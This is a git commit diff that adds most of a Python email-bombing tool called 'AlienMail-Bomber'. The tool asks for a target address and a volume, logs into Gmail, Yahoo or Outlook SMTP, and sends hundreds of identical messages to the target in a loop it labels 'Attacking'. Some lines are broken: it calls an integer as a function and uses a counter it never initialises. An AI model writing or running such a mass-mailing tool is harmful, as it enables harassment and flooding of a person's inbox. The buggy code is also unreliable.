105295769bad527934e1f82f948ebf65b8ecd5f5
CadeyWapp <72588216+CadeyWapp@users.noreply.github.com>
2021-07-27 08:08:46 -0500

    Mostly finished project

--- emailBomb.py
+++ emailBomb.py
@@ -11,7 +11,7 @@ class bcolors:
 
 def banner ():
     print(bcolors.GREEN + '{*}*{*} AlienMail-Bomber v2.0 {*}*{*}')
-    print(bcolors.GREEN + '{*}*{*} Made with secret codes {*}*{*}')
+    print(bcolors.GREEN + '{*}*{*} Made with codes {*}*{*}')
     print(bcolors.GREEN + '''                   
                        .-.
         .-""`""-.    |(@ @)
@@ -28,10 +28,88 @@ class Email_Bomber:
     def __init__(self):
         try:
             print(bcolors.RED + '\n{*}*{*} Launch sequence initializing {*}*{*}')
-            self.target = str(input(bcolors.RED + 'Enter target email <: '))
-            self.mode = str(input(bcolors.RED + 'Enter bomb mode(1,2,3,4) || 1:(100) 2: (250) 3: (750) 4(custom) <: '))
+            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
+            self.mode = int(input(bcolors.GREEN + 'Enter bomb mode(1,2,3,4) || 1:(100) 2: (250) 3: (750) 4(custom) <: '))
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print('Error: Invalid Option. See Ya.')
                 sys.exit(1)
         except Exception as e:
             print(f'Error: {e}')
+
+    def bomb(self):
+        try: 
+            print(bcolors.RED + '\n}{*}*{*}{-- Setting up bomb --}{*}*{*}{')
+            self.amount = None
+            if self.mode == int(1):
+                self.amount = int(100)
+            elif self.mode == int(2):
+                self.amount = int(250)
+            elif self.mode == int(3):
+                self.amount(750)
+            else:
+                self.amount = int(input(bcolors.GREEN + 'Choose a custom payload size <: '))
+            print(bcolors.RED + '\n{*}*{*} You selected bomb mode: {self.mode} and {self.amount} emails {*}*{*}')
+        except Exception as e:
+            print(f'Error: {e}')
+
+    def email(self):
+        try:
+            print(bcolors.RED + '\n{*}*{*} Setting up email {*}*{*}')
+            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade optiions - 1: Gmail 2: Yahoo 3: Outlook <: '))
+            premade = ['1', '2', '3']
+            default_port = True
+            if self.server not in premade:
+                default_port = False
+                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
+
+            if default_port == True:
+                self.port = int(587)
+
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp.mail.outlook.com'
+            
+            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
+            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
+            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+
+
+            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
+            ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+        except Exception as e:
+            print(f'Error: {e}')
+
+    def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + f'Bomb: {self.count}')
+        except Exception as e:
+            print(f'Error: {e}')
+
+    def attack(self):
+            print(bcolors.RED + '\n}{*}*{*}{-- Attacking... --}{*}*{*}{')
+            for email in range(self.amount+1):
+                self.send()
+            self.s.close()
+            print(bcolors.RED + '\n}{*}*{*}{-- Attack Finished --}{*}*{*}{')
+            sys.exit(0)
+
+
+
+if __name__=='__main__':
+    banner()
+    bomb = Email_Bomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
